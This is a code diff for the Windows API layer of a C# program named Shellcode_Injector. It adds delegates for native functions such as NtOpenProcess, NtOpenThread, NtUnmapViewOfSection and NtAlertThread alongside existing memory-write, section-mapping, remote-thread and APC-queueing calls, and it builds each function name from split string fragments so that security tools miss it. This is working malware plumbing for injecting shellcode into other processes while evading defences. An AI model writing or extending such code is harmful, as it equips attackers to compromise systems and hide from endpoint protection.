@@ -3,7 +3,9 @@ using System.Collections.Generic;
 using System.Net;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
+using System.Security.AccessControl;
 using System.Security.Permissions;
+using System.Xml.Linq;
 using static Shellcode_Injector.WinApi;
 
 namespace Shellcode_Injector
@@ -19,16 +21,16 @@ namespace Shellcode_Injector
             cmt_rv = 0x3000,   //MEM_COMMIT_RESERVE
             end = 0xFFFFFFFF
         }
-        
+
         public enum gen : ulong
-        { 
+        {
             sec_accs = 0x10000000,     // Section all access
             sec_cmt = 0x08000000,      // Section commit
             thr_accs = 0x001F0000      // STANDARD_RIGHTS_ALL
         }
 
         public enum proc : uint
-        { 
+        {
             sspnd = 0x00000004,   // CREATE_SUSPENDED
             extinf = 0x00080000   // EXTENDED_STARTUPINFO_PRESENT
         }
@@ -37,6 +39,9 @@ namespace Shellcode_Injector
             success = 0,
             denied = 0xC0000022,
         }
+
+        //PROCESS_ALL_ACCESS
+        public const int all_accs = (int)(0x000F0000L | 0x00100000L | 0xFFFF);
 
         // Struct definitions
         // Extended STARTUP_INFORMATION
@@ -60,7 +65,7 @@ namespace Shellcode_Injector
         {
             PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000L,
         }
- 
+
         // STARTUP_INFORMATION
         [StructLayout(LayoutKind.Sequential)]
         public struct SIN
@@ -102,6 +107,34 @@ namespace Shellcode_Injector
             public bool bInheritHandle;
         }
 
+        //OBJECT_ATTRIBUTES
+        public struct ObjAttr
+        {
+            public int Length;
+            public IntPtr RootDir;
+            public IntPtr ObjName;
+            public uint Attr;
+            public IntPtr SecDesc;
+            public IntPtr SecQoS;
+
+            public ObjAttr(int l, IntPtr rd, IntPtr on, uint attr, IntPtr sd, IntPtr sqos)
+            {
+                Length = l;
+                RootDir = rd;
+                ObjName = on;
+                Attr = attr;
+                SecDesc = sd;
+                SecQoS = sqos;
+            }
+        }
+
+        //CLIENT_ID
+        public struct ClntId
+        {
+            public IntPtr UnqProc;
+            public IntPtr UnqThr;
+        }
+
 
         // PInvoke definitions 
         [DllImport("kernel32", EntryPoint = "#969", SetLastError = true)]
@@ -117,6 +150,9 @@ namespace Shellcode_Injector
 
 
         //Kernel32.dll Delegation definitions
+        //CloseHandle - Handle hProcess
+        public delegate bool CH(IntPtr hproc);
+
         //VirtualAllocEx - hProcess, LpAddress, dwSize, flAllocationType, flProtect
         public delegate IntPtr VAE(IntPtr hproc, IntPtr addr, uint size, uint aloc, uint prot);
 
@@ -143,18 +179,16 @@ namespace Shellcode_Injector
         //    string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation
         public delegate bool CPW(
             [MarshalAs(UnmanagedType.LPWStr)] string app,
-            [MarshalAs(UnmanagedType.LPWStr)] string cmd, 
+            [MarshalAs(UnmanagedType.LPWStr)] string cmd,
             ref SATTR proc_attr,
-            ref SATTR thread_attr, 
-            bool inh_hand, 
-            uint cflags, 
+            ref SATTR thread_attr,
+            bool inh_hand,
+            uint cflags,
             IntPtr env,
-            [MarshalAs(UnmanagedType.LPWStr)]  string cwd, 
-            ref SINEX str_info, 
+            [MarshalAs(UnmanagedType.LPWStr)] string cwd,
+            ref SINEX str_info,
             out PIN proc_info);
 
-        //OpenProcess - dwDesiredAccess, bInheritHandle, dwProcessId
-        public delegate IntPtr OP(uint access, bool ihand, uint pid);
 
         //InitializeProcThreadAttributeList - IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize
         public delegate bool IPTA(IntPtr lpatt, int count, int dflag, ref IntPtr size);
@@ -168,34 +202,45 @@ namespace Shellcode_Injector
 
 
         //ntdll.dll delegation definitions
+        //NtOpenProcess - PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId
+        public delegate int NOP(ref IntPtr phand, uint access, ref ObjAttr objAt, ref ClntId cid);
+
+        //NtOpenThread - PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId
+        public delegate int NOT(ref IntPtr thand, uint access, ref ObjAttr objAt, ref ClntId cid);
+
         //NtCreateSection - out hSection, ulong desired_access, IntPtr object_attributes,
         //ulong max_size, ulong page_attributes, ulong section_attributes, IntPtr file_handle
-        public delegate void NCS(ref IntPtr hSection, ulong daccess, 
+        public delegate int NCS(ref IntPtr hSection, ulong daccess,
             IntPtr oattr, ref ulong size, ulong pattr, ulong sattr,
             IntPtr fhand);
 
         //NtMapViewOfSection - SectionHandle, ProcHandle, *BaseAddress, ZeroBits, CommitSize, SectionOffset,
         //ViewSize, InheritDisposition, AllocationType, Protect
-        public delegate void NMVS(IntPtr hSection, IntPtr phand, out 
-            IntPtr addr, IntPtr zbits, IntPtr csize, IntPtr soff, 
-            out ulong vsize, uint idisps, uint alloctype, 
+        public delegate int NMVS(IntPtr hSection, IntPtr phand, out
+            IntPtr addr, IntPtr zbits, IntPtr csize, IntPtr soff,
+            out ulong vsize, uint idisps, uint alloctype,
             uint protect);
+
+        //NtUnmapViewOfSection - HANDLE ProcHandle, PVOID BaseAddress
+        public delegate void NUVS(IntPtr phand, IntPtr baddr);
 
         //NtCreateThreadEx - out IntPtr hthread, ulong desired_access, IntPtr ObjectAttributes, 
         //IntPtr ProcessHandle, IntPtr RemoteBaseAddress, IntPtr lpParameter, bool CreateSuspended,
         //int StackZeroBits, int SizeOfStackCommit, int SizeOfStackReserve, IntPtr ThreadInfo
-        public delegate void NCTE(out IntPtr hth, ulong daccess, IntPtr oattr, 
-            IntPtr phand, IntPtr remoteaddr, IntPtr lparam, 
-            bool suspend, int szbits, int sc_size, 
+        public delegate int NCTE(out IntPtr hth, ulong daccess, IntPtr oattr,
+            IntPtr phand, IntPtr remoteaddr, IntPtr lparam,
+            bool suspend, int szbits, int sc_size,
             int sr_size, IntPtr tinfo);
 
         //NtQueueApcThread - ThreadHandle, ApcRoutine, ApcRoutineContext, ApcStatusBlock,ApcReserved
         public delegate ntstat NQAT(IntPtr thand, IntPtr addr, IntPtr p1, IntPtr p2, IntPtr p3);
 
+        //NtAlertThread - HANDLE ThreadHandle
+        public delegate ntstat NAT(IntPtr thand);
 
 
         //Hidden functions that will be directly used, maybe change names at some point
-        public static VAE Allocate { get; private set; } 
+        public static VAE Allocate { get; private set; }
         public static VPE Protect { get; private set; }
         public static CRT RemoteThread { get; private set; }
         public static WPM WriteMem { get; private set; }
@@ -206,11 +251,15 @@ namespace Shellcode_Injector
         public static NCS cSection { get; private set; }
         public static NMVS mvSection { get; private set; }
         public static NCTE cThread { get; private set; }
-        public static NQAT NAPC { get; private set; } 
+        public static NQAT NAPC { get; private set; }
         public static IPTA InitAtt { get; private set; }
         public static UPTA UpdateAtt { get; private set; }
         public static DPTA DelAtt { get; private set; }
-        public static OP OpenP { get; private set; }
+        public static NOP OpenP { get; private set; }
+        public static NOT OpenT { get; private set; }
+        public static CH CloseH { get; private set; }
+        public static NUVS Unmap { get; private set; }
+        public static NAT Alert { get; private set; }
 
 
         //Constructor which will initialize the static methods to be used.
@@ -236,7 +285,11 @@ namespace Shellcode_Injector
             mymap.Add("ipta", new List<string> { "In", "iti", "ali", "zeP", "roc", "Th", "read", "Att", "ribu", "teL", "ist" });
             mymap.Add("upta", new List<string> { "Up", "date", "Pr", "ocTh", "read", "At", "trib", "ute" });
             mymap.Add("dpta", new List<string> { "Del", "ete", "Pr", "ocT", "hread", "At", "tri", "buteL", "ist" });
-            mymap.Add("op", new List<string> { "Op", "enP", "roc", "ess" });
+            mymap.Add("nop", new List<string> { "N", "t", "Op", "enP", "roc", "ess" });
+            mymap.Add("not", new List<string> { "N", "t", "Op", "enT", "h", "read" });
+            mymap.Add("ch", new List<string> { "C", "lo", "seH", "and", "le" });
+            mymap.Add("nuvs", new List<string> { "N", "tU", "nm", "apV", "ie", "wOf", "Se", "cti", "on" });
+            mymap.Add("nat", new List<string> { "N", "tA", "ler", "tTh", "read" });
 
 
             //Get function pointers trough LoadLibraryA and GetProcAddress
@@ -257,7 +310,11 @@ namespace Shellcode_Injector
             IntPtr p13 = GPA(main_lib, string.Join("", mymap["ipta"]));
             IntPtr p14 = GPA(main_lib, string.Join("", mymap["upta"]));
             IntPtr p15 = GPA(main_lib, string.Join("", mymap["dpta"]));
-            IntPtr p16 = GPA(main_lib, string.Join("", mymap["op"]));
+            IntPtr p16 = GPA(sec_lib, string.Join("", mymap["nop"]));
+            IntPtr p17 = GPA(sec_lib, string.Join("", mymap["not"]));
+            IntPtr p18 = GPA(main_lib, string.Join("", mymap["ch"]));
+            IntPtr p19 = GPA(sec_lib, string.Join("", mymap["nuvs"]));
+            IntPtr p20 = GPA(sec_lib, string.Join("", mymap["nat"]));
 
 
             //Set the delegated functions that will be used
@@ -276,7 +333,11 @@ namespace Shellcode_Injector
             InitAtt = Marshal.GetDelegateForFunctionPointer<IPTA>(p13);
             UpdateAtt = Marshal.GetDelegateForFunctionPointer<UPTA>(p14);
             DelAtt = Marshal.GetDelegateForFunctionPointer<DPTA>(p15);
-            OpenP = Marshal.GetDelegateForFunctionPointer<OP>(p16);
+            OpenP = Marshal.GetDelegateForFunctionPointer<NOP>(p16);
+            OpenT = Marshal.GetDelegateForFunctionPointer<NOT>(p17);
+            CloseH = Marshal.GetDelegateForFunctionPointer<CH>(p18);
+            Unmap = Marshal.GetDelegateForFunctionPointer<NUVS>(p19);
+            Alert = Marshal.GetDelegateForFunctionPointer<NAT>(p20);
         }
     }
 }
